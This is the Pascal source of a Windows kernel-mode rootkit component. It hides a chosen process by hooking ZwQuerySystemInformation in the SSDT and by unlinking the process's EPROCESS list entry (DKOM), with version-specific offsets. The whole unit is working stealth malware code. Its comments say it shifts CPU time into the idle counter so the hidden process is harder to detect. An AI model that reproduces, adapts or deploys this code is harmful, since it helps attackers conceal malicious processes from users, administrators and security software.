unit UHiddenProcess;

interface

uses nt_status, ntoskrnl, fcall, macros, native, NtoskrnlCustom, KernelUtils, VarConstGlobal;

type
  TZwQuerySystemInformation = Function(SystemInformationClass: SYSTEM_INFORMATION_CLASS; SystemInformation: PVOID; SystemInformationLength: ULONG; ReturnLength: PULONG): NTSTATUS; stdcall;

type
  _OSVERSIONINFOW = record
    dwOSVersionInfoSize: ULONG;
    dwMajorVersion: ULONG;
    dwMinorVersion: ULONG;
    dwBuildNumber: ULONG;
    dwPlatformId: ULONG;
    szCSDVersion: array [0..127] of WCHAR;     // Maintenance string for PSS usage
  end;
  OSVERSIONINFOW = _OSVERSIONINFOW;
  RTL_OSVERSIONINFOW = OSVERSIONINFOW;
  PRTL_OSVERSIONINFOW = ^OSVERSIONINFOW;

	THPStruct = record
		uPid: DWord;
		uFlinkOffset: DWord;
	end;

var
  PZwQuerySystemInformation: TZwQuerySystemInformation;
  lpKeServiceDescriptorTable: PServiceDescriptorEntry;
  _UserTime: LARGE_INTEGER;
  _KernelTime: LARGE_INTEGER;
  _pmdlSystemCall: PMDL;
  MappedSystemCallTable: PPointer;

Procedure VIC_HookZwQuerySystemInformation;
Procedure VIC_UnHookZwQuerySystemInformation;
Function VIC_LEHiddenProcess(_pid: DWord): DWord; stdcall;

implementation

uses vicseh;
{$I vicdeh.pas}

Function RtlGetVersion(lpVersionInformation: PRTL_OSVERSIONINFOW): NTSTATUS; stdcall; external NtKernel name '_RtlGetVersion';

Function ZwQuerySystemInformationNew(SystemInformationClass: SYSTEM_INFORMATION_CLASS; SystemInformation: PVOID; SystemInformationLength: ULONG; ReturnLength: PULONG): NTSTATUS; stdcall;
var
  status: NTSTATUS;
  curr, prev: PSYSTEM_PROCESSES;
  times: PSYSTEM_PROCESSOR_TIMES;
begin
  status:= PZwQuerySystemInformation(
    SystemInformationClass,
    SystemInformation,
    SystemInformationLength,
    ReturnLength );
  if NT_SUCCESS(status) then
  begin
    if (SystemInformationClass = SystemProcessesAndThreadsInformation) then
    begin
      curr:= PSYSTEM_PROCESSES(SystemInformation);
      prev:= NIL;
      while (curr <> NIL) do
      begin
        if (curr^.ProcessId <> 0) then
        begin
          // To filter my PID to hide.
          if (curr^.ProcessId = PID) then
          begin
            // Remove some process in list the ZwQuerySystemInformation was return.
            Inc(_UserTime.QuadPart,curr^.UserTime.QuadPart);
            Inc(_KernelTime.QuadPart,curr^.KernelTime.QuadPart);
            if (prev <> NIL) then // Where is me in the list?
            begin
              if (curr^.NextEntryDelta <> 0) then Inc(prev^.NextEntryDelta,curr^.NextEntryDelta)
              else prev^.NextEntryDelta:= 0; // The last so make prev the end.
            end
            else
            begin
              if (curr^.NextEntryDelta <> 0) then // In the between should be deny this process and continue.
              PAnsiChar(SystemInformation):= PAnsiChar(SystemInformation) + curr^.NextEntryDelta // The first in the list, so move it forward.
              else SystemInformation:= NIL;
            end;
          end;
        end
        else
        begin
          // To reduce the risk of being detected.
          Inc(curr^.UserTime.QuadPart,_UserTime.QuadPart);
          Inc(curr^.KernelTime.QuadPart,_KernelTime.QuadPart);
          _UserTime.QuadPart:= 0;
          _KernelTime.QuadPart:= 0;
        end;
        prev:= curr;
        if (curr^.NextEntryDelta <> 0) then
        PAnsiChar(curr):= PAnsiChar(curr) + curr^.NextEntryDelta
        else curr:= NIL;
      end;
    end
    else
    // The information to get is a exist time of the process.
    if (SystemInformationClass = SystemProcessorTimes) then
    begin
      times:= PSYSTEM_PROCESSOR_TIMES(SystemInformation);
      times^.IdleTime.QuadPart:= times^.IdleTime.QuadPart + _UserTime.QuadPart + _KernelTime.QuadPart;
    end;
  end;
  Result:= status;
end;

Procedure VIC_HookZwQuerySystemInformation;
begin
  if (HidedProcess = False) then
  begin
    lpKeServiceDescriptorTable:= GetImportFunAddr(@KeServiceDescriptorTable);
    _UserTime.QuadPart:= 0;
    _KernelTime.QuadPart:= 0;
    PZwQuerySystemInformation:= TZwQuerySystemInformation(SystemServiceName(GetImportFunAddr(@ZwQuerySystemInformation)));
    // Copy SSDT's mem to MDL struct to change the flags.
    _pmdlSystemCall:= MmCreateMdl(NIL,lpKeServiceDescriptorTable^.ServiceTableBase,lpKeServiceDescriptorTable^.NumberOfServices*4);
    if (_pmdlSystemCall <> NIL) then
    MmBuildMdlForNonPagedPool(_pmdlSystemCall);
    // Chage the MDL's flags.
    _pmdlSystemCall^.MdlFlags:= _pmdlSystemCall^.MdlFlags or MDL_MAPPED_TO_SYSTEM_VA;
    // Skip privilege allows to edit the memory of the SSDT table.
    MappedSystemCallTable:= MmMapLockedPages(_pmdlSystemCall,KernelMode);
    DisableProtection;
    PZwQuerySystemInformation:= TZwQuerySystemInformation(
      InterlockedExchange(
        SystemServiceName(GetImportFunctionAddress(@ZwQuerySystemInformation)),
        DWord(@ZwQuerySystemInformationNew)));
    EnableProtection;
    HidedProcess:= True;
  end;
end;

Procedure VIC_UnHookZwQuerySystemInformation;
begin
  if (HidedProcess = True) then
  begin
    DisableProtection;
    InterlockedExchange(
      SystemServiceName(GetImportFunctionAddress(@ZwQuerySystemInformation)),
      DWord(@PZwQuerySystemInformation));
    EnableProtection;
    if (_pmdlSystemCall <> NIL) then
    begin
      MmUnmapLockedPages(MappedSystemCallTable,_pmdlSystemCall);
      IoFreeMdl(_pmdlSystemCall);
    end;
  HidedProcess:= False;
  end;
end;

Function RestoreListEntry(Address:PLIST_ENTRY): Boolean;
begin
  Result:= False;
  if not MmIsAddressValid(Address) then Exit;
  if not MmIsAddressValid(Address^.BLink) then Exit;
  if not MmIsAddressValid(Address^.FLink) then Exit;
  Address^.BLink^.FLink:= Address;
  Address^.FLink^.BLink:= Address;
  Result:= True;
end;

Function DeleteListEntry(Address: PLIST_ENTRY): Boolean;
begin
  Result:= False;
  if not MmIsAddressValid(Address) then Exit;        // Object2 (This process) is exists?
  if not MmIsAddressValid(Address^.BLink) then Exit; // Object1 is exists?
  if not MmIsAddressValid(Address^.FLink) then Exit; // Object3 is exists?
  Address^.BLink^.FLink:= Address^.FLink; // Object1.Flink = Object3.Flink
  Address^.FLink^.BLink:= Address^.BLink; // Object1.Blink = Object3.Blink
  Result:= True;
end;

Procedure _DeleteListEntry(pList: Pointer); stdcall;
asm
  pushf
  pushad
  mov eax,pList                // eax = _EPROCESS.ActiveProcessLinks
  mov ecx,dword ptr ds:[eax+4] // ecx = pListProcs.Blink
  mov edx,dword ptr ds:[eax]   // edx = pListProcs.Flink
  mov dword ptr ds:[ecx],edx   // [pListProcs.Blink] = pListProcs.Flink
  mov ecx,dword ptr ds:[eax]   // ecx = pListProcs.Flink
  mov edx,dword ptr ds:[eax+4] // edx = pListProcs.Blink
  mov dword ptr ds:[ecx+4],edx // [pListProcs.Flink] = pListProcs.Blink
  mov dword ptr ds:[eax],eax   // Object1.Flink = addr Object3.Flink
  mov dword ptr ds:[eax+4],eax // Object3.Blink = addr Object1.Flink
  popad
  popf
end;

Function VIC_LEHiddenProcess(_pid: DWord): DWord; stdcall;
var
	status: NTSTATUS;
	dwEProcAddr: DWord;
	pListProcs: PListEntry;
	pEProc: Pointer;
  hps: THPStruct;
  osvi: RTL_OSVERSIONINFOW;
const VER_PLATFORM_WIN32_NT = 2;
label _seh;
begin
  Result:= 0;
  RtlGetVersion(@osvi);
  if (osvi.dwPlatformId <> VER_PLATFORM_WIN32_NT) then
  begin
    DbgPrint('VIC: This is Window 64 bit. This funtion only activate on Windows 32 bit' + CRLF);
    Exit;
  end;
  case osvi.dwMajorVersion of
    5:
    begin
      case osvi.dwMinorVersion of
        0:
        begin
          hps.uFlinkOffset:= $A0;
          DbgPrint('VIC: - Windows 2000' + CRLF);
        end;
        1:
        begin
          hps.uFlinkOffset:= $88;
          DbgPrint('VIC: - Windows XP' + CRLF);
        end;
        2:
        begin
          hps.uFlinkOffset:= $00; (**)
          DbgPrint('VIC: - Windows XP Pro x64 Edition or Windows Server 2003 or Windows Home Server or Windows Server 2003 R2' + CRLF);
        end;
        else
        begin
          hps.uFlinkOffset:= $00; (**)
          DbgPrint('VIC: - Could not detect Operating System' + CRLF);
        end;
      end;
    end;
    6:
    begin
      case osvi.dwMinorVersion of
        0:
        begin
          hps.uFlinkOffset:= $A0;
          DbgPrint('VIC: - Windows Vista or Windows Server 2008' + CRLF);
        end;
        1:
        begin
          hps.uFlinkOffset:= $B8;
          DbgPrint('VIC: - Windows 7 or Windows Server 2008 RC 2' + CRLF);
        end;
        2:
        begin
          hps.uFlinkOffset:= $00; (**)
          DbgPrint('VIC: - Windows 8 or Windows Server 2012' + CRLF);
        end;
        else
        begin
          hps.uFlinkOffset:= $00; (**)
          DbgPrint('VIC: - Could not detect Operating System' + CRLF);
        end;
      end;
    end
    else
    begin
      hps.uFlinkOffset:= $00; (**)
      DbgPrint('VIC: - Could not detect Operating System' + CRLF);
    end;
  end;
  if (hps.uFlinkOffset <> 0) then
  begin
    hps.uPid:= _pid;
    status:= PsLookupProcessByProcessId(hps.uPid,pEProc);
    if (NTSTATUS(status) = STATUS_SUCCESS) then
    begin
      {$I vic.try}
      dwEProcAddr:= DWord(pEProc);
      pListProcs:= PListEntry(Pointer(dwEProcAddr + hps.uFlinkOffset));
      IsHidden:= not IsHidden;
      if (IsHidden = False) then DeleteListEntry(pListProcs) // Hidden
      else RestoreListEntry(pListProcs); // UnHidden
      {$I vic.except}
    end;
  end else DbgPrint('VIC: Cannot to hidden process' + CRLF);
  Result:= hps.uPid;
end;

end.
